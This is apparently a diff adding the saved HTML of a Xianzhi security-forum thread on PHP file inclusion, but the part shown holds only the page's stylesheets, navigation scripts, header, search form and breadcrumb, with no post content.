+.menuHalf li{float:left;width:50%;border-right:1px dashed #d5e6ed;margin-right:-1px;}
+ul#post_typeChoose a{padding:0;}
+/*注册结构*/
+.regTitle{border-bottom:1px dotted #a2a2a2;padding:0 5px;margin-bottom:40px;}
+.regTitle h5{font-size:16px; font-weight:700;color:#9a9a9a;padding:10px 0 15px 45px;background:url(images/register/regtitle.png) 5px 0 no-repeat;}
+.regTitle .fr{margin-top:20px;}
+.regForm{width:750px;margin:auto;}
+.regForm dl{min-height:43px;_height:43px;}
+.regForm dt{float:left;width:100px;text-align:right;margin-right:15px;line-height:28px;font-size:14px;}
+.regForm dd{float:left;}
+.regForm .ip{width:230px;margin-right:1px;}
+.regForm .ip div{padding:3px 3px 5px;*padding:4px 5px 4px;float:left;border:1px solid;border-color:#999 #ccc #ccc #999;}
+.regForm .ip div.current{background:#e0f9d0;}
+.regForm .ip div.hover,.regForm .ip div:hover{background:#fffbde;border:1px solid;border-color:#555 #aaa #aaa #555;}
+.regForm .ip input{border:0;padding:0;margin:0;font:14px/15px Arial;background:none;width:100%;padding-top:2px;width:222px;*width:218px; font-weight:700;color:#333;}
+.regForm .tp div{padding:5px 10px 5px 28px;width:230px;position:absolute;line-height:16px;}
+.regForm .tp .correct{border:0;background:url(images/register/regright.png) 6px 6px no-repeat;height:20px;}
+.regForm .tp .ignore{border:1px solid #e8e8e8;background:#f9f9f9 url(images/register/tp.png) 6px 6px no-repeat;color:#999;}
+.regForm .tp .wrong{border:1px solid #ebadb0;background:#fff2f5 url(images/register/regwrong.png) 6px 5px no-repeat;color:#b52726;padding-left:28px;}
+.regForm .tp img{vertical-align:middle;margin:5px 0 0 8px;}
+.regForm dd.ck input{width:50px}
+.regForm dd.ck div{margin-right:5px;}
+.regPre{margin:0 135px 10px 115px;}
+.regPre pre{border:1px solid;border-color:#999 #ccc #ccc #999;padding:5px 10px;line-height:1.5;color:#333;height:100px;overflow-x:hidden;overflow-y:scroll;}
+.regPre p{margin-bottom:5px;}
+/*关注*/
+.follow,.following{ background:url(u/images/follow.png) no-repeat;line-height:16px;}
+.follow{padding-left:16px; background-position:-4px -43px;_background-position:-4px -40px;}
+.following{padding-left:22px; background-position:-20px -22px;}
+/*全局颜色*/
+.s1{color:#f00;}/*red*/
+.s2{color:#f60;}/*org*/
+.s3{color:#7a0;}/*green*/
+.s4{color:#0066cc;}/*blue*/
+.s5{color:#333;}/*black*/
+.s6{color:#000;}/*black*/
+.s7{color:$68b;}/*min blue*/
+.gray{color:#999;}
+.gray2{color:#bbb;}
+ /*自定义css*/
+/*首页调用*/
+.w705{ width:705px;}
+.w220{ width:220px;}
+.w735{width:735px}
+.aliyun_text{width:320px;}
+.aliyun_hot{ border-bottom:1px dashed #d4d4d4;}
+.aliyun_hot dd{color:#999; line-height:21px; padding:4px 0 5px;}
+.aliyun_list{ line-height:28px; margin-top:6px;}
+.aliyun_list a{ color:#666;}
+.aliyun_list em a { color:#666;}
+.boxR{ border:1px solid #e8e8e8;}
+.boxR h5{ border-bottom:1px solid #e5e5e5; background:#f5f5f5; height:35px; line-height:35px; font-size:12px; color:#333; font-weight:700; text-indent:15px;}
+.boxR_dl{ border-bottom:1px solid #f1f1f1; margin:0 15px; padding:20px 0 15px; overflow:hidden;*zoom:1; color:#666; line-height:21px;}
+.boxR_dl dt{float:left; margin-right:10px;}
+.boxR_dl dt img{width:40px; height:40px;}
+.boxR_dl dd a{color:#666;}
+.boxR_img a{margin-bottom:15px; display:block;}
+.mt5{margin-top:5px;}
+.banzhu a{color:#999;}
+.icon-msg-show{
+	position:absolute;
+	width:20px;
+	height:20px;
+	-webkit-border-radius: 50%;
+	-moz-border-radius: 50%;
+	-ms-border-radius: 50%;
+	-o-border-radius: 50%;
+	border-radius: 50%;
+	background:#f60;
+	color:#fff;
+	top:-12px;
+	right:-7px;
+	display:block;
+	overflow:hidden;
+	text-align:center;
+	line-height:20px;
+	z-index:10
+
+}
+.aliyun_list_tuij{
+	padding:0 5px 6px 9px;
+	line-height:24px;
+}
+/*推荐板块样式*/
+.aliyun_tuij{
+	border:1px solid #e8e8e8;
+	border-top-width: 4px;
+}
+.aliyun_tuij .aliyun_tuij_in{
+	padding:8px 15px;
+	background:#fff;
+}
+.aliyun_tuij .aliyun_tuij_in h3{
+	font-weight:700;
+	font-size:14px;
+	padding-bottom:10px;
+	display:block;
+}
+.aliyun_tuij .aliyun_tuij_in ul li{
+	line-height:22px
+}
+.aliyun_tuij .aliyun_tuij_in a{
+	color:#666;
+}
+/*add by siwei*/
+.read-recommend{float:left;border-radius:4px;background-color:#f4f4f4;width:60px;text-align:center;padding:8px 0px;color:#999}
+
+</style><!--css-->
+<style>
+	html,body{
+		background-color:#fff;
+	}
+	.aisle{
+		pointer:cursor;
+	}
+	.hidden{
+		display:none;
+	}
+
+	a,a:link{
+		color:#333;
+	}
+	a:hover{
+		color:#00a2ca;
+	}
+	a.y-btn:link {
+		color: #fff;
+	}
+	a.y-btn-white:link {
+		color: #00a2ca;
+	}
+
+	.topbar-box { position: relative; height: 31px; background: #373D41; color: #fff; }
+	.topbar-box .w1200 { position: relative; }
+	.topbar-box .logo { position: relative; top: 5px; margin-right: 5px; color: #fff; }
+	.topbar-box .logo:hover { opacity: .8; text-decoration: none; }
+	.topbar-box .logo span { position: relative; top: -5px; }
+	.topbar-box .quick-link { position: absolute; top: 0; right: 0; height: 31px; line-height: 31px; }
+	.topbar-box .quick-link a { margin-left: 10px; color: #fff; }
+	.topbar-box .quick-link a:hover { opacity: .8; }
+	.topbar-box .user-info img { position: relative; top: 5px; width: 20px; border-radius: 20px; }
+	.topbar-box .user-info .username { margin-left: 5px; }
+
+	.header .nav { display: none; }
+	.header .slogo a { color: #00a1ca; }
+</style>
+
+<link rel="stylesheet" href="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/simplemde.css">
+<script type="text/javascript" language="JavaScript" src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/core.js"></script>
+<script type="text/javascript" language="JavaScript" src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/pw_ajax.js"></script>
+<script type="text/javascript" language="JavaScript" src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/simplemde.js"></script>
+<script language="JavaScript">var imgpath = 'images';var verifyhash = '86484017c517c92d';var modeimg = '';var modeBase = '';var winduid = '';var windid	= '';var groupid	= 'guest';var basename = '';var temp_basename = '';var db_shiftstyle = '1';var simplemde;var mdmode = true;var mding = false;
+function doBackWind(){
+    mding = false;
+    mdmode = false;
+    editor.setHTML(code2HTML('[markdown]'+simplemde.value()+'[/markdown]'));
+    B.css(B.$('.B_editor'),'display','block');
+    B.css(B.$('#mdtext'),'display','none');
+    editor.focus();
+}
+
+function code2HTML(str){
+    str = str.replace(/</g, '&lt;');
+    str = str.replace(/>/g, '&gt;');
+    return str.replace(/\n/g, '<br />');
+}
+
+</script>
+<script type="text/javascript" src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/common.js"></script>
+<script type="text/javascript" src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/Account.js"></script>
+
+
+</head>
+<body onkeydown="try{keyCodes(event);}catch(e){}" data-spm="bbsr2204">
+<div class="topbar-box">
+	<div class="w1200">
+		<a href="https://xianzhi.aliyun.com/" class="logo">
+<img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/xz_logo.png">
+<span>先知（安全情报）</span>
+		</a>
+
+		<div class="quick-link">
+<a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxianzhi.aliyun.com%2Fforum%2Fread%2F2204.html%3Ffpage%3D2&amp;from_type=xianzhi">登录</a>
+		</div>
+
+
+
+	</div>
+</div>
+
+
+
+	<div class="header cc" data-spm="1">
+<div class="w1200">
+	<h2 class="slogo fl"><a href="https://xianzhi.aliyun.com/forum">安全技术社区</a></h2>
+<!--
+	<ul class="nav fr">-->
+<!-- <li><a href="index.php?m=bbs" >首页</a><i class="border"></i></li> -->
+<!-- <li><a href="fourms.php" >论坛</a><i class="border"></i></li> -->
+<!-- <li><a href="group.php" >群组</a><i class="border"></i></li> -->
+<!--	</ul>
+-->
+</div>
+	</div>
+	<!-- /header -->
+
+	<div class="search-wrap" data-spm="2">
+		<div class="w1200 cc">
+<div class="search-box fl">
+<form action="searcher.php" method="post" onsubmit="return searchInput();">
+	<input value="86484017c517c92d" name="verify" type="hidden">
+	<input value="2" class="s_input" name="step" type="hidden">
+	<input value="thread" class="s_input" name="type" id="hiddenType" type="hidden">
+	<input class="search-txt" placeholder="搜索其实很简单！(^_^)" id="search_input" name="keyword" type="text">
+	<input class="submit-btn" value="搜索" type="submit">
+</form>
+</div>
+<!-- /主搜 -->
+<div class="unlogin-user-account-wrap fr">
+		<a class="aisle" id="aisle">我的快捷通道<i></i></a>
+	<div class="unlogin-popup hidden" id="unlogin-popup">
+		<p>您还没有登录，快捷通道只有在登录后才能使用。&nbsp;<a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxianzhi.aliyun.com%2Fforum%2Fread%2F2204.html%3Ffpage%3D2&amp;from_type=xianzhi">立即登录</a><br>还没有帐号？&nbsp;赶紧 <a href="https://account.aliyun.com/register/register.htm?oauth_callback=https%3A%2F%2Fxianzhi.aliyun.com%2Fforum%2Fread%2F2204.html%3Ffpage%3D2&amp;from_type=yundun-bbs">注册一个</a></p>
+	</div>
+</div>
+		</div>
+	</div>
+	<!-- /搜索 -->
+
+
+<script language="javascript">
+var timeoutSpecifyId = {};
+var navBStyle = '';
+var aisle = getObj('aisle');
+
+function tmpClose(elementId) {
+    timeoutSpecifyId[elementId] = setTimeout(function() {
+        getObj(elementId).style.display = 'none';
+    }, 100);
+}
+function tmpHideAllCross(currentSubMenuId,showNavB) {
+	if(!getObj('navB')) return;
+	if (showNavB) {
+		getObj('navB').style.display = '';
+	}
+    var elements = getElementsByClassName('navB', getObj('navB'));
+    if(elements.length){
+        for (i=0; i<elements.length; i++) {
+            if (elements[i].id != '' && elements[i].id != currentSubMenuId) elements[i].style.display = 'none';
+        }
+    }
+}
+
+function ctrlSubMenu(parentId, subMenuId) {
+    try {
+		clearTimeout(timeoutSpecifyId[subMenuId]);
+
+		tmpHideAllCross(subMenuId,true);
+		getObj(subMenuId).style.display = '';
+
+		getObj(parentId).onmouseout = function() {
+tmpClose(subMenuId);
+ timeoutSpecifyId[parentId] = setTimeout(function() {
+	if (navBStyle) {
+		getObj('navB').style.display = 'none';
+	}
+}, 100);
+getObj(parentId).onmouseout = '';
+		};
+		getObj(subMenuId).onmouseout = function() {
+tmpClose(subMenuId);
+if (navBStyle) {
+	getObj('navB').style.display = 'none';
+}
+		};
+		getObj(subMenuId).onmouseover = function() {
+clearTimeout(timeoutSpecifyId[subMenuId]);
+clearTimeout(timeoutSpecifyId[parentId]);
+getObj(subMenuId).style.display = '';
+getObj('navB').style.display = '';
+		};
+	}catch(e){}
+}
+
+var showToggle = function(eId){
+	var _ele = getObj(eId);
+	if(_ele){
+		_ele.style.display = _ele.style.display==="block"?"none":"block";
+	}
+};
+
+
+if(aisle){
+	var _currentEle,_timer,_currentFastObj;
+	if(''){
+		_currentEle = 'user-popup';
+	}else{
+		_currentEle = 'unlogin-popup';
+	}
+	_currentFastObj = getObj(_currentEle);
+	aisle.onclick = function(event){
+		 var e = event || window.event;
+	    if (e.stopPropagation){
+	        e.stopPropagation();
+	        e.preventDefault();
+	     }else{
+	    	e.cancelBubble = true;
+	    	e.returnValue = false;
+	    }
+	    showToggle(_currentEle);
+	};
+
+	aisle.onmouseover = function(){
+		clearTimeout(_timer);
+		_currentFastObj.style.display = "block";
+	};
+	aisle.onmouseout = function(){
+		_timer = setTimeout(function(){
+getObj(_currentEle).style.display = "none";
+		},100)
+	};
+	_currentFastObj.onmouseover = function(){
+		clearTimeout(_timer);
+		_currentFastObj.style.display = "block";
+	};
+	_currentFastObj.onmouseout = function(){
+		_timer = setTimeout(function(){
+_currentFastObj.style.display = "none";
+		},100)
+
+	};
+
+}
+
+
+
+</script>
+
+
+<div class="w1200">
+<style type="text/css">
+/*广播台*/
+.radio{height:140px;border:1px solid #a6cbe7;background:#fff 
+url(images/bbsradio.png) left center 
+no-repeat;min-width:800px;overflow:hidden;}
+.radioDl{padding:0 0 0 580px;margin:0;}
+.radioDl dt{margin:0 0 0 -540px;padding:0;}
+.radioDl dt .div{float:left;padding:13px 0 0 10px;}
+.radioDl dt .div p{ text-align:center;line-height:25px;}
+.radioUl {padding:7px 5px 0;}
+.radioUl 
+li{line-height:24px;height:24px;font-size:12px;overflow:hidden;}
+.radioBg .view-hover,.radioBg 
+.view-current{min-height:135px;_height:135px;}
+/*名片*/
+.card{border:1px solid #c0d8ea;width:433px;position:absolute;margin:-9px
+ 0 0 -16px;background:#fff;-webkit-box-shadow:4px 4px 0 
+#e4e4e4;-moz-box-shadow:4px 4px 0 #e4e4e4;box-shadow:4px 4px 0 
+#e4e4e4;z-index:9;}
+.card a{color:#014c90;}
+.card dl{padding-right:10px;}
+.card dt{width:160px;overflow:hidden;}
+.card dt .face_img{margin:8px 15px;float:left;}
+.card dt p{padding-left:15px;}
+.card dd{width:260px;padding:5px 0;float:right;}
+.card dd li{height:23px;overflow:hidden;line-height:23px;}
+.card dd.ddA{border-bottom:1px dotted #ccc;}
+.card dd.ddA span{display:inline-block;width:60px;}
+.card dd.ddB{padding:10px 0;}
+.card dd.ddB a{padding-left:20px;margin-right:16px;}
+.half li{float:left;width:49.5%;}
+.face_img:hover{text-decoration:none;}
+.face_img img{width:120px;height:120px;}
+.floot_leftdiv .author{height:20px;line-height:20px;}
+.floot_leftdiv .author a{font-size: 14px;color: #00a2ca;display: 
+block;float: left;height: 20px;width: 84px;overflow: hidden;}
+.readLevel{margin-top:15px;clear:both;}
+
+.floot_leftdiv .author 
+img{margin-top:2px;margin-right:5px;display:block;float:left;}
+/*帖子结构*/
+.floot_leftdiv{overflow:hidden;}
+.floot_left{background:#FBFBFB;}
+.readCon_right{float:right;clear:right;padding-bottom:10px;margin-left:10px;}
+.tpc_content{/*float:left;
+ clear:left;*/}
+.operTips{padding: 10px 0;
+margin: 0 0 10px;
+color: #666;
+text-align: center;
+background: #f1f6fa;
+border: 1px solid #e2eced;}
+/*帖子管理*/
+.readAdmin{border-top:1px solid #a6cbe7;padding:5px 0;}
+.readAdmin a{float:left;line-height:20px;height:20px;padding:0 
+10px;border:1px solid 
+#a6cbe7;margin-right:5px;background:#fff;color:#666; cursor:pointer;}
+.readAdmin a:hover{ text-decoration:none;border:1px solid 
+#de8a13;background:#fcfae3;color:#000;}
+/*楼层信息*/
+.readNum{overflow:hidden;background-color:#FBFBFB}
+.readNum ul{padding:7px 0;margin-left:-1px;width:160px;}
+.readNum li{float:left;width:64px;padding-left:15px;border-left:1px 
+solid #d8e5ea;line-height:14px;}
+.readNum li em{display:block; font-weight:700;padding-bottom:3px;}
+/*楼层直达*/
+.readStairs{padding-top:5px;}
+.readStairs span{line-height:22px;}
+.readStairs 
+.input{width:54px;height:26px;text-align:center;-webkit-border-radius:4px;-moz-border-radius:
+ 4px;border-radius: 4px;background-color: #fff;-webkit-box-shadow: inset
+ 0 2px #f2f2f2;-moz-box-shadow: inset 0 2px #f2f2f2;box-shadow: inset 0 
+2px #f2f2f2;border: solid 1px d4d4d4;padding:1px;vertical-align:top}
+.readStairs img{margin-top:5px;}
+/*用户信息*/
+.readName{ font:bold 12px/18px Arial;padding:10px 0 0 
+15px;margin-bottom:-5px;}
+.readHonor{color:#666;margin:0 0 5px;line-height:18px;width:128px;}
+.readFace img{line-height:1;display:block;border:1px solid 
+#e4e4e4;padding:3px;background:#fff;margin-bottom:3px;}
+.readFace p img{border:0; display:inline;}
+.readLevel{line-height:25px;margin-bottom:15px}
+.readLevel img{display:block;}
+.readUser_info{margin-top:15px;}
+.readUser_info .one{padding:10px 0px 5px;}
+.readUser_info .one a{color:#666;}
+.readUser_info .one a:hover{border-bottom:1px solid #ccc;}
+.readUser_info dt{width:60px;float:left;margin-right:5px;}
+.readUser_info dd{float:left;width:70px;color:#666;}
+.readUser_info ul.two{line-height:18px;}
+.readUser_info ul.two li{float:left;width:49.5%;padding:2px 
+0;height:18px;}
+.readUser_info ul.two li a{display:block; text-indent:15px;}
+.add_mes{ background:url(images/post-icon.png) no-repeat 0 -396px;}
+.add_fol{ background:url(images/post-icon.png) no-repeat 0 -411px;}
+.add_adm{ background:url(images/pwicon/add_adm.png) no-repeat;}
+.add_gag{ background:url(images/pwicon/add_gag.png) no-repeat;}
+.add_fri{ background:url(images/pwicon/add_fri.png) no-repeat;}
+.add_pro{ background:url(images/pwicon/add_pro.png) no-repeat;}
+.add_home{ background:url(images/pwicon/add_home.png) no-repeat;}
+/*楼主留言*/
+.louMes{width:300px;background:#f7fbff;border-left:4px solid 
+#e8f0f7;padding:10px;line-height:1.5;margin:20px 0; font-size:12px;}
+/*主楼用户操作*/
+.userOper{ text-align:center;margin:0 0 25px;}
+.userOper a{background:#f3f9fb url(images/post-icon.png) 8px 4px 
+no-repeat;line-height:24px;height:24px;padding: 0 12px 0 30px;;
+display:inline-block;color:#fff;-moz-border-radius:3px;-webkit-border-radius:3px;margin:0
+ 1px; font-family:Simsun;font-weight:700}
+.userOper a:hover{ text-decoration:none;background-color:#eaf4fc;}
+.userOper a.r_keep{ background-position:8px -227px;background-color: 
+#f60;}
+.userOper a.r_score{ background-position:8px -255px;background-color: 
+#00a2ca;}
+.userOper a.r_recommend{ background-position:8px -54px;}
+.userOper a.r_dig{ background-position:8px -155px;background-color: 
+#57C4E9;}
+/*关联主题*/
+.related h4{display:block;padding:5px 0;border-bottom:1px dashed 
+#e4e4e4;}
+.related ul{padding:10px 0;border-bottom:1px dashed #e4e4e4;}
+/*floot ad*/
+.flootbg{background:#E5E5E5;height:2px;}
+.flootbg div{overflow:hidden;}
+.flootbg div img{float:left;}
+/*图片列表*/
+.imgList{margin:10px 0;}
+.imgList h4{height:25px;padding:0 10px 0 
+30px;line-height:25px;background:#f3f9fb url(images/wind85/file/img.gif)
+ 10px center no-repeat;;border-top:1px solid #a6cbe7;border-bottom:1px 
+solid #d5e6ed;}
+.imgList h4 a{color:#014c90;margin:0 3px;}
+.imgList h4 a.current{color:#333; font-weight:700;}
+.imgList ul{padding-top:10px;}
+.imgList li{float:left;width:20%;padding:0 0 
+10px;height:125px;overflow:hidden;}
+.imgList .tac img{ width:120px;height:120px;}
+.imgList li img{ cursor:pointer;}
+.imgList ul.one li{float:none;width:auto;height:auto;}
+.forbid{padding-left:20px;background:#fff url(images/pwicon/forbid.png) 0
+ center 
+no-repeat;line-height:20px;height:20px;display:inline-block;height:20px;position:absolute;right:0;_right:20px;top:0;color:#ff0000;}
+/*shareAll*/
+.shareAll{padding:0
+ 12px;border:1px solid #d5e6ed;background:#F4F4F4;}
+.shareAll em{float:left;background:url(images/wind85/breadEm.png) right 
+center no-repeat;padding:5px 18px 5px 0;}
+.shareAll a{float:left;margin:6px 0 0 
+8px;width:16px;height:16px;display:block;overflow:hidden; 
+text-indent:-2000em;background:url(images/pwicon/shareAll.png) 
+no-repeat;filter:alpha(opacity=80);-moz-opacity:0.8;opacity:0.8;}
+.shareAll a:hover{filter:alpha(opacity=100);-moz-opacity:1;opacity:1;}
+/*新幻灯片*/
+.pImg_wrap{position:absolute;z-index:1002;}
+.pImg{background:#ffffff;}
+.pImg_bg{position:absolute;background:#000;width:100%;height:100%;filter:alpha(opacity=50);-moz-opacity:0.5;opacity:0.5;left:0;right:0;top:0;bottom:0;z-index:1001;}
+.wysiwyg
+ img {
+    width: 100%;
+}
+.bcr1,.bcr2,.bcr3,.bcr4,.pibg1,.pibg2,.pibg3,.pibg4{overflow:hidden;z-index:1005;line-height:0
+ }
+.bcr1,.bcr2,.bcr3,.bcr4{width:5px;height:5px;background:url(images/search/pImg.png)
+ no-repeat;}
+.pibg1,.pibg2,.pibg3,.pibg4{ background:#ffffff;}
+.pibg1{height:5px;}
+.pibg2{width:5px;}
+.pibg3{height:5px;}
+.pibg4{width:5px;}
+.bcr1{ background-position:0 0;}
+.bcr2{ background-position:-5px 0;}
+.bcr3{ background-position:-5px -5px;}
+.bcr4{ background-position:0 -5px;}
+.pImg_close{background:url(images/search/pImg_close.png);float:right;width:15px;height:15px;text-indent:-2000em;overflow:hidden;-webkit-transition:
+ all 0.2s ease-out;margin:3px 0 0 0;display:inline;}
+.pImg_close:hover{background-position:0 -15px;}
+.imgLoading{overflow:hidden;position:relative;}
+.imgLoading img{display:block;width:100%;height:100%;}
+.aPre,.aNext{position:absolute;background:url(images/blank.gif);width:45%;padding-bottom:5000px;margin-bottom:-5000px;}
+.aPre{cursor:url(u/images/pre.cur),auto;}
+.aNext{cursor:url(u/images/next.cur),auto;right:0;}
+/*!
+ wysiwyg.css v0.0.2 | MIT License | github.com/jgthms/wysiwyg.css 
+*/.wysiwyg{line-height:1.6}.wysiwyg a{text-decoration:none}.wysiwyg 
+a:hover{border-bottom:1px solid}.wysiwyg abbr{border-bottom:1px 
+dotted;cursor:help}.wysiwyg cite{font-style:italic}.wysiwyg 
+hr{background:#e6e6e6;border:none;display:block;height:1px;margin-bottom:1.4em;margin-top:1.4em}.wysiwyg
+ img{vertical-align:text-bottom}.wysiwyg 
+ins{background-color:lime;text-decoration:none}.wysiwyg 
+mark{background-color:#ff0}.wysiwyg small{font-size:0.8em}.wysiwyg 
+strong{font-weight:700}.wysiwyg sub,.wysiwyg 
+sup{font-size:0.8em}.wysiwyg sub{vertical-align:sub}.wysiwyg 
+sup{vertical-align:super}.wysiwyg p,.wysiwyg dl,.wysiwyg ol,.wysiwyg 
+ul,.wysiwyg blockquote,.wysiwyg pre,.wysiwyg 
+table{margin-bottom:1.4em}.wysiwyg p:last-child,.wysiwyg 
+dl:last-child,.wysiwyg ol:last-child,.wysiwyg ul:last-child,.wysiwyg 
+blockquote:last-child,.wysiwyg pre:last-child,.wysiwyg 
+table:last-child{margin-bottom:0}.wysiwyg p:empty{display:none}.wysiwyg 
+h1,.wysiwyg h2,.wysiwyg h3,.wysiwyg h4,.wysiwyg h5,.wysiwyg 
+h6{font-weight:700;line-height:1.2}.wysiwyg h1:first-child,.wysiwyg 
+h2:first-child,.wysiwyg h3:first-child,.wysiwyg h4:first-child,.wysiwyg 
+h5:first-child,.wysiwyg h6:first-child{margin-top:0}.wysiwyg 
+h1{font-size:2.4em;margin-bottom:.58333em;margin-top:.58333em;line-height:1}.wysiwyg
+ 
+h2{font-size:1.6em;margin-bottom:.875em;margin-top:1.75em;line-height:1.1}.wysiwyg
+ 
+h3{font-size:1.3em;margin-bottom:1.07692em;margin-top:1.07692em}.wysiwyg
+ 
+h4{font-size:1.2em;margin-bottom:1.16667em;margin-top:1.16667em}.wysiwyg
+ 
+h5{font-size:1.1em;margin-bottom:1.27273em;margin-top:1.27273em}.wysiwyg
+ h6{font-size:1em;margin-bottom:1.4em;margin-top:1.4em}.wysiwyg 
+dd{margin-left:1.4em}.wysiwyg ol,.wysiwyg 
+ul{list-style-position:outside;margin-left:1.4em}.wysiwyg 
+ol{list-style-type:decimal}.wysiwyg ol 
+ol{list-style-type:lower-alpha}.wysiwyg ol ol 
+ol{list-style-type:lower-roman}.wysiwyg ol ol ol 
+ol{list-style-type:lower-greek}.wysiwyg ol ol ol ol 
+ol{list-style-type:decimal}.wysiwyg ol ol ol ol ol 
+ol{list-style-type:lower-alpha}.wysiwyg ul{list-style-type:disc}.wysiwyg
+ ul ul{list-style-type:circle}.wysiwyg ul ul 
+ul{list-style-type:square}.wysiwyg ul ul ul 
+ul{list-style-type:circle}.wysiwyg ul ul ul ul 
+ul{list-style-type:disc}.wysiwyg ul ul ul ul ul 
+ul{list-style-type:circle}.wysiwyg blockquote{border-left:4px solid 
+#e6e6e6;padding:0.6em 1.2em}.wysiwyg blockquote 
+p{margin-bottom:0}.wysiwyg code,.wysiwyg kbd,.wysiwyg samp,.wysiwyg 
+pre{-moz-osx-font-smoothing:auto;-webkit-font-smoothing:auto;background-color:#f2f2f2;color:#333;font-size:0.9em}.wysiwyg
+ code,.wysiwyg kbd,.wysiwyg 
+samp{border-radius:3px;line-height:1.77778;padding:0.1em 0.4em 
+0.2em;vertical-align:baseline}.wysiwyg pre{overflow:auto;padding:1em 
+1.2em}.wysiwyg pre 
+code{background:none;font-size:1em;line-height:1em}.wysiwyg 
+figure{margin-bottom:2.8em;text-align:center}.wysiwyg 
+figure:first-child{margin-top:0}.wysiwyg 
+figure:last-child{margin-bottom:0}.wysiwyg 
+figcaption{font-size:0.8em;margin-top:.875em}.wysiwyg 
+table{width:100%}.wysiwyg table pre{white-space:pre-wrap}.wysiwyg 
+th,.wysiwyg td{font-size:1em;padding:.7em;border:1px solid 
+#e6e6e6;line-height:1.4}.wysiwyg thead tr,.wysiwyg tfoot 
+tr{background-color:#f5f5f5}.wysiwyg thead th,.wysiwyg thead td,.wysiwyg
+ tfoot th,.wysiwyg tfoot td{font-size:.9em;padding:.77778em}.wysiwyg 
+thead th code,.wysiwyg thead td code,.wysiwyg tfoot th code,.wysiwyg 
+tfoot td code{background-color:#fff}.wysiwyg tbody 
+tr{background-color:#fff}
+
+/* add by yantu*/
+.read_h1{
+	position: relative;
+	overflow: hidden;
+	padding: 10px 0 10px 30px;
+	font-size: 14px;
+	font-weight: 700;
+	line-height: 32px;
+}
+
+
+
+.post_num,.coin_num{
+	margin-left:40px;
+}
+
+.star div {
+	height: 15px;
+	background: url(/images/star.png) repeat-x 0 0;
+}
+
+.links{padding-top: 15px;}
+
+.links a {
+	color: #666;
+	padding-left: 15px;
+	background: url(images/post-icon.png) no-repeat 0 -377px;
+}
+
+.links .add-follow-icon {
+	margin-right: 8px;
+	background-position: 1px -411px;
+}
+
+.links .write-letter-icon {
+	background-position: 0 -396px;
+}
+
+.floot_right{
+	padding: 10px 10px 15px 30px;
+	overflow: hidden;
+	border-left: 1px solid #efefef;
+}
+
+.menuList{
+	width:138px;
+}
+
+.tipTop{
+	margin:10px 0px;
+	padding-bottom:15px;
+	border-bottom: 1px dashed #e9e9e9;
+}
+
+.update-tips {
+	padding: 15px 150px 15px 10px;
+	margin-bottom: 30px;
+	border: 1px dashed #ccc;
+	background: #f7f7f7 url(/images/dere1.png) no-repeat right center;
+}
+
+.update-tips p {
+	font-size: 14px;
+	line-height: 24px;
+}
+
+.re-edit{
+	margin-bottom: 20px;
+	font-size: 12px;
+	color: #999;
+}
+
+.re-edit a {
+	color: #999;
+}
+
+
+
+</style><!--ads begin-->
+<!--[if IE]>
+<style type="text/css">
+.readUser_info .one dt{padding-top:1px;}
+</style>
+<![endif]-->
+<!--弹窗遮罩-->
+<!-- //start reply管理弹出 -->
+<div id="postbatch" style="display:none" class="popout">
+	<table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="bgcorner1"></td><td class="pobg1"></td><td class="bgcorner2"></td></tr><tr><td class="pobg4"></td><td>
+		<div class="popoutContent">
+<div>
+	<div class="popTop" style="cursor:move;" onmousedown="read.move(event);">
+		<a href="javascript:void(0)" class="adel" onclick="closep()">关闭</a>
+		<span class="mr20">选中<span class="b s2" id="select_count">1</span>篇</span>
+	</div>
+	<div class="p10 cc">
+	</div>
+	<div class="popBottom cc">
+		<label class="fl"><input onclick="replyManage.checkall(this);" value="" id="ajaxall" name="ajaxall" type="checkbox">全选</label>
+	</div>
+</div>
+		</div>
+	</td><td class="pobg2"></td></tr><tr><td class="bgcorner4"></td><td class="pobg3"></td><td class="bgcorner3"></td></tr></tbody></table>
+</div>
+<!-- //end reply管理弹出 -->
+<!--广播台开始-->
+<!--面包屑-->
+<div id="breadCrumb" class="cc">
+	<ul class="fr">
+		<li><a href="https://xianzhi.aliyun.com/forum/searcher.php?sch_time=newatc" rel="nofollow">最新帖子</a></li>
+		<li><a href="https://xianzhi.aliyun.com/forum/searcher.php?digest=1" rel="nofollow">精华区</a></li>
